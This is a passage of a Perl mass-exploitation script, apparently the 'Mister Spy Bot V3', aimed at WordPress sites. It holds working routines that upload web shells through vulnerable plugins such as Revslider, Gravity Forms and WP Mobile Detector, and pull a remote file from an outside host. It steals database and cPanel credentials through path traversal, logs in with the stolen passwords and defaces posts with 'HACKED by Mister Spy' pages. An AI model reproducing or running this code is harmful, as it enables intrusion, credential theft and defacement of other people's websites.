$wpmdshell = "http://localhost/cloudmobile.php";
$url = "$site/wp-content/plugins/wp-mobile-detector/resize.php?src=$wpmdshell";
$wpmdup="$site/wp-content/plugins/wp-mobile-detector/cache/cloudmobile.php?X=sphinx";

my $check = $ua->get("$url"); 

my $checkup = $ua->get("$wpmdup")->content; 
if($checkup =~/Mister Spy/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[WP Mobile Shell Up]";
print color('bold white')," ................ ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wpmdup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$wpmdup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[WP Mobile Detector]";
print color('bold white')," ................ ";
print color('bold red'),"[Failed]\n";
}
}
################ WP Mobile Defa #####################

sub wpmobiledetector2(){ 

$wpmdshell = "http://talws.gr//spy.gif";
$url = "$site/wp-content/plugins/wp-mobile-detector/resize.php?src=$wpmdshell";
$wpmdupindex="$site/wp-content/plugins/wp-mobile-detector/cache/spy.gif";

$def= "$wpmdupindex";
$check = $ua->get($wpmdupindex)->status_line;
if ($check =~ /200/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[WP Mobile Image Up]";
print color('bold white')," ................ ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Image Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wpmdupindex\n";
open (TEXT, '>>Result_v4/index.txt');
print TEXT "$wpmdupindex\n";
close (TEXT);
zoneh();
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[WP Mobile Detector]";
print color('bold white')," ................ ";
print color('bold red'),"[Failed]\n";
}
}

################ InBoundio Marketing #####################

sub inboundiomarketing(){ 

my $url = "$site/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php";
$inbomarketingup = "$site/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/spyx.php?X=sphinx";
my $inbomarketingres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["spyx.php"],]);

$checkinbomarketing = $ua->get("$inbomarketingup")->content;
if($checkinbomarketing =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[InBoundio Marketing]";
print color('bold white')," ............... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $inbomarketingup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$inbomarketingup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[InBoundio Marketing]";
print color('bold white')," ............... ";
print color('bold red'),"[Failed]\n";
}
}

################ dzs-zoomsounds #####################

sub dzszoomsounds(){

my $url = "$site/wp-content/plugins/dzs-zoomsounds/admin/upload.php";
$dzsup = "$site/wp-content/plugins/dzs-zoomsounds/admin/upload/spyx.php?X=sphinx";
my $dzsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file_field => ["spyx.php"],]);

$checkdzsup = $ua->get("$dzsup")->content;
if($checkdzsup =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[dzs-zoomsounds]";
print color('bold white')," .................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $dzsup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$dzsup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[dzs-zoomsounds]";
print color('bold white')," .................... ";
print color('bold red'),"[Failed]\n";
}
}

################ reflex-gallery #####################

sub reflexgallery(){ 
my $url = "$site/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=$year&Month=$month";
$reflexup = "$site/wp-content/uploads/$year/$month/spyx.php?X=sphinx";
my $reflexres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["spyx.php"],]);

$checkreflexup = $ua->get("$reflexup")->content;
if($checkreflexup =~/Mister Spy/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Reflex Gallery]";
print color('bold white')," .................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $reflexup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$reflexup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Reflex Gallery]";
print color('bold white')," .................... ";
print color('bold red'),"[Failed]\n";
}
}

################ Creative Contact Form #####################

sub sexycontactform(){ 

my $url = "$site/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php";
$sexycontactup = "$site/wp-content/plugins/sexy-contact-form/includes/fileupload/files/spyx.php?X=sphinx";
my $field_name = "files[]";

my $sexycontactres = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["spyx.php"] ]
           
            );

$checksexycontactup = $ua->get("$sexycontactup")->content;
if($checksexycontactup =~/Mister Spy/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Creative Contact Form]";
print color('bold white')," ............. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $sexycontactup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$sexycontactup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Creative Contact Form]";
print color('bold white')," ............. ";
print color('bold red'),"[Failed]\n";
}
}

################ Work The Flow File Upload #####################

sub wtffu(){

my $url = "$site/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/";
my $shell ="spyx.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$wtffup="$site/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/spyx.php?X=sphinx";

$checkwtffup = $ua->get("$wtffup")->content;
if($checkwtffup =~/Mister Spy/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Work The Flow File Upload]";
print color('bold white')," ......... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wtffup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$wtffup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Work The Flow File Upload]";
print color('bold white')," ......... ";
print color('bold red'),"[Failed]\n";
}
}

################  PHP Event Calendar #####################

sub phpeventcalendar(){

my $url = "$site/wp-content/plugins/php-event-calendar/server/file-uploader/";
my $shell ="spyx.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$phpevup="$site/wp-content/plugins/php-event-calendar/server/file-uploader/spyx.php?X=sphinx";

if ($response->content =~ /{"files/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[PHP Event Calendar]";
print color('bold white')," ................ ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $phpevup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$phpevup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[PHP Event Calendar]";
print color('bold white')," ................ ";
print color('bold red'),"[Failed]\n";
}
}

################ Synoptic #####################

sub synoptic(){

my $url = "$site/wp-content/themes/synoptic/lib/avatarupload/upload.php";
my $shell ="spyx.php";
my $field_name = "qqfile";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$Synopticup="$site/wp-content/uploads/markets/avatars/spyx.php?X=sphinx";

$checkSynopticup = $ua->get("$Synopticup")->content;
if($checkSynopticup =~/Mister Spy/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Synoptic]";
print color('bold white')," .......................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $Synopticup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$Synopticup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Synoptic]";
print color('bold white')," .......................... ";
print color('bold red'),"[Failed]\n";
}
}

################ Wpshop #####################

sub Wpshop(){

my $url = "$site/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload";
my $shell ="spyx.php";
my $field_name = "wpshop_file";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$wpshopup="$site/wp-content/uploads/spyx.php?X=sphinx";

$checkwpshopup = $ua->get("$wpshopup")->content;
if($checkwpshopup =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Wp Shop]";
print color('bold white')," ........................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wpshopup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$wpshopup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Wp Shop]";
print color('bold white')," ........................... ";
print color('bold red'),"[Failed]\n\n";
}
}

############### formcraft ####################

sub formcraft(){

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[FormCraft Upload] .................. ";

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (10);
$link = $site."/wp-content/plugins/formcraft/file-upload/server/php/";
my $conte = $ua->get("$link")->content;
if ($conte =~/{"files"/){
   
    upform();
}else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');

}

}

sub upform(){
{
my $url = "$site/wp-content/plugins/formcraft/file-upload/server/php/";
my $picture ="xx.php"; 
my $field_name = "files[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$picture"] ]
           
            );
$upzzspy = $site. '/wp-content//plugins//formcraft//file-upload//server//php//files//xx.php'; 
my $taz = $ua->get("$upzzspy")->content;
if ($taz =~ /Mister Spy/){
   print color('bold green');
print "[Success]\n";
print color('reset');

open(save, '>>Result_v4/Shell3z.txt');   
print save "$upzzspy\n";   
close(save);
}else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');}
}

}

############### Revslider ####################

sub getconfig{

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Revslider Config] .................. ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$config = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";
$conflink = "$site/$config";
$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold green');
print "[Sucess]\n";
    print color('reset');
    print save "[rev cnfg] $site\n";   
    close(save);
$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$cont = $resp->content;
while($cont =~ m/DB_NAME/g){


        if ($cont =~ /DB_NAME\', \'(.*)\'\)/){
        print "\t[-]Database Name = $1 \n";
print color 'reset';
        open (TEXT, '>>Result_v4/config.txt');
        print TEXT "\n[ DATABASE ] \n$site\n[-]Database Name = $1";
        close (TEXT);
        }
        if ($cont =~ /DB_USER\', \'(.*)\'\)/){
        print "\t[-]Database User = $1 \n";
print color 'reset';
        open (TEXT, '>>Result_v4/config.txt');
        print TEXT "\n[-]Database User = $1";
        close (TEXT)
        }
        if ($cont =~ /DB_PASSWORD\', \'(.*)\'\)/){
        print "\t[-]Database Password = $1 \n";
print color 'reset';
        $pass= $1 ;
        open (TEXT, '>>Result_v4/config.txt');
        print TEXT "\nDatabase Password = $pass";
        close (TEXT)
        }
        if ($cont =~ /DB_HOST\', \'(.*)\'\)/){
        print "\t[-]Database Host = $1 \n\n";
print color 'reset';
        open (TEXT, '>>Result_v4/config.txt');
        print TEXT "\n[-]Database Host = $1";
        close (TEXT)
        }

wpbrute();
getcpconfig();
}}else{
    print color('bold red');
   print "[Failed]\n";
    print color('reset');

getcpconfig();

}

}

############### getcpconf ####################

sub getcpconfig{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Revslider Cpanel] .................. ";

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$cpup = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../../.my.cnf";
$cpuplink = "$site/$cpup";
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$cont = $resp->content;
if($cont =~ m/user=/g && $cont =~ m/password=/g){
    print color('bold green');
print "[Success]\n";
    print color('reset');

    print save "[rev cpnl] $site\n";   
    close(save);
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$contt = $resp->content;
while($contt =~ m/user/g){
        if ($contt =~ /user=(.*)/){

        print "\n\t[-]Cpanel User = $1 \n";
print color 'reset';
        open (TEXT, '>>Result_v4/cp.txt');
        print TEXT "\n[ cpanel ] \n$site\n[-]cpanel user = $1";
        close (TEXT);
        }
        if ($contt =~ /password="(.*)"/){
        print "\t[-]Cpanel Pass = $1 \n\n";
print color 'reset';
        open (TEXT, '>>Result_v4/cp.txt');
        print TEXT "\n[-]Cpanel Pass = $1";
        close (TEXT)
        }


}
}else{    print color('bold red');
print  "[Failed]\n";
    print color('reset');

}


}

###############   Pma  ####################

sub pmaa{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Php My Admin Wp] ................... ";

use HTTP::Request;
use LWP::UserAgent;
@pat=('/phpMyAdmin/','/phpmyadmin/');
foreach $pma(@pat){
chomp $pma;

$url = $site.$pma;
$req = HTTP::Request->new(GET=>$url);
$userAgent = LWP::UserAgent->new();
$response = $userAgent->request($req);
$ar = $response->content;
if ($ar =~ m/Welcome to phpMyAdmin|Username|Password/g){
    print color('bold green');
print "[Success]\n";
    print color('reset');
open (TEXT, '>>Result_v4/config.txt');
print TEXT "\n[PhpMyAdmin] $url \n\n";
close (TEXT);

}else{

    print color('bold red');
print  "[Failed]\n";
    print color('reset');

}
}

}

############### wpinjetc  ####################

sub wpinjetc($site){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Wordpress Inject] .................. ";

$linkposts = $site . 'index.php/wp-json/wp/v2/posts/';



$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (30);


$sorm = $ua->get($linkposts);
$karza = $sorm->content;
if($karza =~/\/?p=(.*?)\"\}/)
{
$id=$1;
$ajx = $site . '/wp-json/wp/v2/posts/'.$id;



	
$defx="														<h2><center>Mister Spy <center></h2>
						</div>
						<div class=\"post_content\">
							<p><title>HACKED by Mister Spy
</title></p>
<div style=\"text-align: center\"><font size=\"6\" face=\"comic sans ms\"><b>Hacked By Mister Spy Bot V3</b></font></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b><br /></b></font></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b><font color=red>HACKED</font> Mister Spy <font color=red>HACKED</font> Mister Spy <font color=red>HACKED</font> Mister Spy <font color=red>HACKED</font> Mister Spy <font color=red>HACKED</font> Mister Spy <br /></b></font></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b>thank you gassrini for the tool  <br /></b></font></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b></p>
<p>
						</div>";
$file="spy.html";
$sirina=$id . 'justracccwdata';
$def=  $site . 'spy.html';
$gassface = POST $ajx, ['id' => $sirina, 'title' => 'HACKED By Mister Spy', 'slug'=> $file,'content' => $defx];
$response = $ua->request($gassface);
$stat = $response->content;
	if ($stat =~ /Mister Spy/){
   print color('bold green');
print "[Succes]\n";
    print color('reset');
				    open(save, '>>Result_v4/index.txt');  
    print save "$def\n";  
    close(save);
zoneh();

	}
else{
   print color('bold red');
print "[Failed]\n";
    print color('reset');}
}
else{
   print color('bold red');
print "[Failed]\n";
    print color('reset');}
}

############### wp brute  ####################
sub wpbrute{
$red = $site . '/wp-admin/';
$wp= $site . 'wp-login.php';
$admin = "admin";

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Wordpress Brute] ................... ";


$brute = POST $wp, [log => $admin, pwd => $pass, wp-submit => 'Log In', redirect_to => $red];
$response = $ua->request($brute);
$stat = $response->status_line;
        if ($stat =~ /302/){
    print color('bold green');
print "[Success]\n";
    print color('reset');
        open (TEXT, '>>Result_v4/brute.txt');
        print TEXT "\n$site/wp-login.php => User :$admin Password:$pass\n";
        close (TEXT);
        }else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');

}
pmaa();
}

############### Revshell  ####################

sub revshell(){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Revslider Shell] ................... ";

my $path = "wp-admin/admin-ajax.php";


my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_plugin", update_file => ["taz.zip"]]);

if ($exploit->decoded_content =~ /Wrong update extracted folder/) {
    print color('bold green');
print "[Success]\n";
    print color('reset');

my $check = $ua->get("$site/wp-content/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($check =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Uploading Shell] ................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');

    open(save, '>>Result_v4/Shell3z.txt');
    print save "$site/wp-content/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
	$def = "$site/def.html";
	zoneh();
    } else {  }
my $avada = $ua->get("$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($avada =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Uploading Shell] ................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>Result_v4/Shell3z.txt');
    print save "$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
    	$def = "$site/def.html";
	zoneh();

}
else {  }
my $striking_r = $ua->get("$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($striking_r =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Uploading Shell] ................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>Result_v4/Shell3z.txt');
    print save "$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else {  }
my $IncredibleWP = $ua->get("$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($IncredibleWP =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Uploading Shell] ................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>Result_v4/Shell3z.txt');
    print save "$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else {  }
my $ultimatum = $ua->get("$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($ultimatum =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Uploading Shell] ................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>Result_v4/Shell3z.txt');
    print save "$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else {  }
my $medicate = $ua->get("$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/cloud.php")->content;
if($medicate =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Uploading Shell] ................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>Result_v4/Shell3z.txt');
    print save "$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else {  }
my $centum = $ua->get("$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/cloud.php")->content;
if($centum =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Uploading Shell] ................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>Result_v4/Shell3z.txt');
    print save "$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else {  }
my $beach_apollo = $ua->get("$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($beach_apollo =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Uploading Shell] ................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>Result_v4/Shell3z.txt');
    print save "$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else { }
my $cuckootap = $ua->get("$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($cuckootap =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Uploading Shell] ................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>Result_v4/Shell3z.txt');
    print save "$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else {  }
my $pindol = $ua->get("$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/cloud.php")->content;
if($pindol =~/Mister Spy/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Uploading Shell] ................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";

    open(save, '>>Result_v4/Shell3z.txt');
    print save "$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else {  }
my $designplus = $ua->get("$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($designplus =~/Mister Spy/) {

	    print color('bold yellow');
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Uploading Shell] ................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>Result_v4/Shell3z.txt');
    print save "$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else {  }
my $rarebird = $ua->get("$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($rarebird =~/Mister Spy/) {

	    print color('bold yellow');
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Uploading Shell] ................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');
    open(save, '>>Result_v4/Shell3z.txt');
    print save "$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else {  }
my $andre = $ua->get("$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($andre =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Uploading Shell] ................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>Result_v4/Shell3z.txt');
    print save "$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else { }
} else {
    print color('bold red');
print  "[Failed]\n";
    print color('reset');
}
}


############### gravity  #####################

sub gravity(){

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Gravity] ........................... ";

$site = $_;
my $path = "/?gf_page=upload";

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["11.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../", name => "css.php.jd"]);
if ($exploit->decoded_content =~ /_input_3_css.php.jd/) {
	


my $check = $ua->get("$site/wp-content/uploads/_input_3_css.php.jd")->content;
my $checkk = $ua->get("$site/wp-includes/wp-footer.php")->content;
if($checkk =~/Mister Spy/) {
print "[Success]\n";

    open(save, '>>Result_v4/Shell3z.txt');
	
    print save "$site/wp-includes/wp-footer.php\n";
	
    close(save);
}else {
     print color('bold red');
print "[Failed]\n";
    print color('reset');
}

  my $checkkk = $ua->get("$site/def.html")->content;
    if($checkkk =~m/Mister Spy/i) {
  
		
        open(save, '>>Result_v4/index.txt');
        print save "$site/def.html\n";
        close(save);
	$def="$site/def.html";
	zoneh();
} 
}else {
     print color('bold red');
print "[Failed]\n";
    print color('reset');

}

	
}

############### inde Gr  #####################

sub upindex{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Index gravity] ..................... ";
my $path = "/?gf_page=upload";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $indexploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["def.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../../../", name => "mrspybotv3.html"]);
if ($indexploit->decoded_content =~ /_input_3_mrspybotv3.html/) {
    $def= $site . '/_input_3_mrspybotv3.html';
	    print color('bold green');
    print "[Sucess]\n$def\n";
    print color('reset');

    open(save, '>>Result_v4/index.txt');
    print save "[Gravity] : $def\n";
    close(save);
        zoneh();
       }else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');
       }
   }

############### Job mNA  #####################

sub jombmang(){

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Job Manger Exploit] ................ ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (10);
$link ="$site/jm-ajax/upload_file";
my $conte = $ua->get("$link")->content;
if($conte =~/{"files/) {
   
    print color("green"), "[vuln]";
    print color('reset');
    print " $site\n";
    open(save, '>>job.txt');
